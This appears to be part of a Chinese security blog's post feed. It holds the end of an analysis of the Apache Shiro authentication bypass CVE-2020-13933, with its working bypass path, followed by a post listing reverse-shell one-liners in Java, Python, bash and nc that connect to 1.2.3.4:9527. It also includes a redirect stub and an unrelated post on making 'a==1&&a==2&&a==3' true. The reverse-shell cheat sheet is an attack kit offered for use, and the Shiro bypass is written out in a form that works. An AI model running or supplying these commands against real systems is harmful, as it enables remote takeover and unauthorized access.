class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// path = "/res/"  （标准化 URL： 处理双斜杠、路径穿越）</span>    <span class="token keyword">return</span> path<span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// path = "/res/"</span><span class="token comment" spellcheck="true">//  return normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./04.png"></p><p>很明显，该 PoC 通过 Shiro 处理后， 请求路由 <code>/res/%3bpoc</code> 会变成 <code>/res/</code>， 根据前面靶场的验证结果，因为此路由没有指定资源名称，因此不会触发身份认证，请求会直接送到 Spring 的相关逻辑处理以获取资源。</p><p>此时再 DEBUG 看看 Spring 的处理请求路由的入口代码 <a href="https://github.com/spring-projects/spring-framework/blob/v5.2.5.RELEASE/spring-web/src/main/java/org/springframework/web/util/UrlPathHelper.java"><code>UrlPathHelper.java</code></a> 是如何做的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 输入请求路由： http://127.0.0.1:8080/res/%3bpoc</span><span class="token keyword">private</span> String <span class="token function">decodeAndCleanUriString</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> String uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc" （URL 未解码）</span>    uri <span class="token operator">=</span> <span class="token function">removeSemicolonContent</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// uri = "/res/%3bpoc"  （截断 ; 后面的内容）</span>    uri <span class="token operator">=</span> <span class="token function">decodeRequestString</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （URL 字符解码）</span>    uri <span class="token operator">=</span> <span class="token function">getSanitizedPath</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// uri = "/res/;poc"    （标准化 URL： 处理双斜杠）</span>    <span class="token keyword">return</span> uri<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./05.png"></p><p>其实在这里已经可以发现，因为 Shiro 和 Spring 对 URL 的处理逻辑顺序不一致，导致两者得到的路由不同。</p><p>不妨根据这两段代码的逻辑，横向对比输入不同 URL 的情况下最终结果有什么差异。</p><ol><li>当输入为 <a href="http://127.0.0.1:8080/res/%3bpoc">http://127.0.0.1:8080/res/%3bpoc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td><td align="center">输入</td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/%3bpoc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center"><code>;poc</code></td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="2"><li>当输入为 <a href="http://127.0.0.1:8080/res/;poc">http://127.0.0.1:8080/res/;poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/;poc</code></td><td align="center">输入</td><td align="center"><code>/res/;poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/;poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><ol start="3"><li>当输入为 <a href="http://127.0.0.1:8080/res/poc">http://127.0.0.1:8080/res/poc</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/poc</code></td><td align="center">输入</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/poc</code></td><td align="center">URL 解码</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/poc</code></td></tr><tr><td align="center">资源名</td><td align="center"><code>poc</code></td><td align="center">资源名</td><td align="center"><code>poc</code></td></tr><tr><td align="center">结果</td><td align="center">302 跳转身份认证</td><td align="center">结果</td><td align="center">返回资源页面</td></tr></tbody></table><ol start="4"><li>当输入为 <a href="http://127.0.0.1:8080/res/">http://127.0.0.1:8080/res/</a> 时：</li></ol><table><thead><tr><th align="center">Shiro 逻辑</th><th align="center">路由</th><th align="center">Spring 逻辑</th><th align="center">路由</th></tr></thead><tbody><tr><td align="center">输入</td><td align="center"><code>/res/</code></td><td align="center">输入</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 解码</td><td align="center"><code>/res/</code></td><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td></tr><tr><td align="center">截断 <code>;</code></td><td align="center"><code>/res/</code></td><td align="center">URL 解码</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td><td align="center">URL 标准化</td><td align="center"><code>/res/</code></td></tr><tr><td align="center">资源名</td><td align="center">无资源名</td><td align="center">资源名</td><td align="center">无资源名</td></tr><tr><td align="center">结果</td><td align="center">不触发验证</td><td align="center">结果</td><td align="center">无资源返回</td></tr></tbody></table><h3 id="0x33-分析结论"><a href="#0x33-分析结论" class="headerlink" title="0x33 分析结论"></a>0x33 分析结论</h3><p>显然除了第 1 种输入，其它 3 种输入的最终输出碰巧都是一致的，而第 1 种输入正是此漏洞的 PoC 。</p><p>造成这种情况的根本原因在于 Shiro 和 Spring 在【URL 截断】和【URL 解码】的操作顺序不一致。</p><p>回顾 URL 的处理过程，总结下来就是：</p><ul><li>URL 进入到 Shiro 时，因为先做 URL 编码 <code>%3b =&gt; ;</code> ，使得路由中的资源名被截断删除</li><li>Shiro 误以为请求路由中无资源名，故该次请求不触发身份认证逻辑</li><li>因不需要身份认证，请求路由被直接转发到 Spring</li><li>Spring 从请求路由中正确截取资源名称，并返回资源页面</li><li>最终导致 Shiro 身份认证被绕过</li></ul><blockquote><p>由于 Shiro 的身份认证是通过判断 URL 匹配来实现的，只要能找到 Shiro 处理 URL 逻辑与 Spring 框架处理 URL 逻辑不一致的地方，都有可能造成身份认证绕过。</p></blockquote><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><p>对于这个漏洞，PoC 亦是 EXP ，只需要把 <code>%3b</code> 放在请求资源路由的最前面，即可绕过认证实现资源访问。</p><p>例如： <code>http://127.0.0.1:8080/res/%3b{资源名}</code> （<code>res</code> 属于站点根目录， 不属于资源路由的一部分）</p><p>当资源路由为后台路径时，攻击者即可绕过认证访问到后台资源。</p><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>从漏洞分析过程可知，只需要调整 Shiro 处理逻辑顺序，使其与 Spring 保持一致即可修复此漏洞。</p><p>但是可能考虑到相同的漏洞已经出现连续了 2 次，所以官方使用了一种更灵活的修复方式：</p><p>不难发现官方补丁 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.6.0</code></a> 并没有修复 <a href="https://github.com/apache/shiro/blob/shiro-root-1.5.3-release-vote1/web/src/main/java/org/apache/shiro/web/util/WebUtils.java"><code>Shiro 1.5.3</code></a> 中有关 <code>WebUtils</code> 的问题代码。</p><p>取而代之的是引入了责任链模式，增加了针对 URL 的预处理过滤器 <a href="https://github.com/apache/shiro/blob/shiro-root-1.6.0/web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java"><code>InvalidRequestFilter.java</code></a>，使得 URL 在到进入 Shiro 处理逻辑之前，就通过过滤器对分号、反斜杠和非 ASCII 字符预先进行过滤。尔后若这段修复代码再出现类似漏洞 ，要修复则简单得多。</p><h2 id="0x60-挖掘思路"><a href="#0x60-挖掘思路" class="headerlink" title="0x60 挖掘思路"></a>0x60 挖掘思路</h2><p>前面已经说过，由于 Shiro 的权限校验是通过判断 url 匹配来实现的，因此一般的挖掘思路是： 如果能找到 Shiro 处理 URL 逻辑与 web 框架处理 URL 逻辑不一致的地方，那么就有可能利用它进行权限绕过。</p><p>但说到底，此漏洞是某个白帽子在做渗透测试试题时偶尔发现的，否则除非是深谙 Shiro 和相关 web 框架的源码、知道两者处理 URL 逻辑的不一致，不然要在正常情况下发现这个漏洞几无可能。</p><p>在不熟悉底层代码逻辑的前提下，可以留意所关注框架的 CVE 修复补丁，通过确认修复内容，推理修复逻辑是否完整合理，也不失是一种捷径。这个漏洞也是这样被发现的，可以说这个漏洞的发现，偶然中带着必然。</p><h2 id="0x70-参考资料"><a href="#0x70-参考资料" class="headerlink" title="0x70 参考资料"></a>0x70 参考资料</h2><ul><li>《<a href="https://github.com/apache/shiro">Github： Apache Shiro 源码</a>》</li><li>《<a href="https://xz.aliyun.com/t/7964">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a>》</li><li>《<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-13933">Vulmon 漏洞情报（CVE-2020-13933）</a>》</li><li>《<a href="https://nosec.org/home/detail/4531.html">【安全通报】Apache Shiro &lt; 1.6.0 权限绕过漏洞（CVE-2020-13933）</a>》</li><li>《<a href="https://www.anquanke.com/post/id/214964">shiro &lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)</a>》</li><li>《<a href="https://xz.aliyun.com/t/8223">shiro CVE-2020-11989&amp;CVE-2020-13933复现分析</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种语言的一句话反弹 shell 命令</title>
      <link href="/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/"/>
      <url>/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击主机先监听端口"><a href="#攻击主机先监听端口" class="headerlink" title="攻击主机先监听端口"></a>攻击主机先监听端口</h2><p>最简单的脚本可以用 nc ：</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="被攻击主机连接到服务端口"><a href="#被攻击主机连接到服务端口" class="headerlink" title="被攻击主机连接到服务端口"></a>被攻击主机连接到服务端口</h2><p>一般都需要通过 RCE、 webshell 等方式在被攻击机执行以下命令，具体怎么做就要看水平了：</p><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh 1.2.3.4 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> /tmp/backpipe p/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">></span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报播报</title>
      <link href="/safe/threat-broadcast/"/>
      <url>/safe/threat-broadcast/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/threat-broadcast/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何令永假式成真？</title>
      <link href="/safe/ru-he-ling-yong-jia-shi-cheng-zhen/"/>
      <url>/safe/ru-he-ling-yong-jia-shi-cheng-zhen/</url>
      
        <content type="html"><![CDATA[<p>最近在 <a href="https://stackoverflow.com/questions/48270127/can-a-1-a-2-a-3-ever-evaluate-to-true">Stack Overflow</a> 无意中发现一个挺有意思的问题：</p><blockquote><p>是否可以令永假式 <code>a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3</code> 的值为 <code>true</code> ？**</p></blockquote><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>当时看到题干，条件反射就想到了可以通过 C++ 实现，因为 C++ 是可以重写运算符的，其实现代码如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span><span class="token operator">:</span>        <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">NumOP</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">&lt;=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    NumOP <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"impossable!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"It's right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为闲得慌，又萌生出了一个念头：其他语言是否也都可以实现这个表达式呢？</p><p>其实仔细分分析一下题干，要使得表达式成真，可以从两个思路切入：</p><ul><li>(1) 要么 <code>==</code> 的判定逻辑被篡改</li><li>(2) 要么 <code>a</code> 的值要在判断过程中自动变化，此时 <code>a</code> 不可能是基础数据类型（可能是对象、是函数、或是引用）</li></ul><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>因为 Python 和 C++ 同样支持运算符重写，于是类似地可以得到 Python 的实现代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num <span class="token operator">=</span> num    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>num <span class="token operator">&lt;=</span> num<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>    a <span class="token operator">=</span> NumOP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>而对于 ruby 则可以利用它的一个语法糖简单实现：调用函数函数时，其参数列表可以不写括号。</p><p>那么只需要定义一个无入参的函数 <code>a</code> ，根据条件动态控制函数 <code>a</code> 的返回值即可，其实现代码如下：</p><pre class="line-numbers language-ruby"><code class="language-ruby"><span class="token keyword">def</span> a    <span class="token variable">$i</span> <span class="token operator">||</span><span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># $i 是全局变量</span>    <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">end</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>    puts <span class="token string">"impossable!"</span><span class="token keyword">else</span>    puts <span class="token string">"It's right."</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>对于 JavaScript ，可以利用运算符 <code>==</code> 的松散相等特性：当 <code>==</code> 两边操作数的类型不相同时， JS 引擎会尝试把其中一个操作数类型转换成另一个操作数类型。</p><p>在这题里面，若左侧操作数 <code>a</code> 是对象，右侧是数字，则会隐式调用对象 <code>a</code> 的 <code>valueOf</code> 方法将其转换成数字；若转换失败则调用 <code>toString</code> 方法后再将其转换成数字。</p><p>显然，只需要控制 <code>valueOf</code> 逻辑使其满足每次 <code>==</code> 的判定即可，其实现代码如下：</p><blockquote><p>注：此方法对于严格相等运算符 <code>===</code> 不起作用。</p></blockquote><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>     valueOf<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>这么多语言中，最麻烦的就是 Java 了。主要是 Java 不允许重写运算符，只能利用 <code>a</code> 做文章。</p><p>但 Java 要求 <code>==</code> 两边类型一致，而右侧的 <code>1</code>/<code>2</code>/<code>3</code> 是 <code>int</code> 基础类型，因此 <code>a</code> 会受到 Java 的 <strong>编译语法</strong> 约束，只可能是 <code>int</code> 基础类型或其包装类 <code>Integer</code>。而结合本题来看，<code>a</code> 只可能是 <code>Integer</code> 对象。</p><p>根据 Java 的语言特性，<code>Integer == int</code> 在比对之前，会自动拆包使得两边的类型一致，事实上会变成 <code>Integer.intValue() == int</code>。</p><p>理论上本应只需要重写 <code>Integer.intValue()</code> 即可。</p><p>而事实上 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，直接导致无法重写 <code>Integer.intValue()</code>。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换言之无法直接实现。</p><p>但是若条件变更如下，则有可能实现：</p><pre class="line-numbers language-java"><code class="language-java">a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该条件比对的是 <code>Integer == Integer</code>，由于两侧操作数均是对象，实际比对的是对象地址的引用，只需要想办法篡改两个引用的对象（使其相同）即可达到目的。</p><hr><p>此时可以利用 Java【静态缓存】的特性 —— <code>Integer</code> 为了优化空间和效率，对于特定范围的常量值会放入常量池：</p><ul><li>当 <code>Integer</code> 类 <strong>第一次</strong> 被载入内存时，会通过内部类 <code>IntegerCache</code> 把 <code>[-128, 127]</code> 范围内的整数包装成 <code>Integer</code> 对象并缓存到 <code>Integer cache[]</code> 数组。</li><li>以后再用 <code>Integer</code> 初始化变量时，若其赋值范围在 <code>[-128, 127]</code> 之间，则直接返回 <code>cache</code> 数组中对应的引用，不再重新开辟内存。</li></ul><p>详细可见 <code>Integer</code> 的源码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">IntegerCache</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> high<span class="token punctuation">;</span>        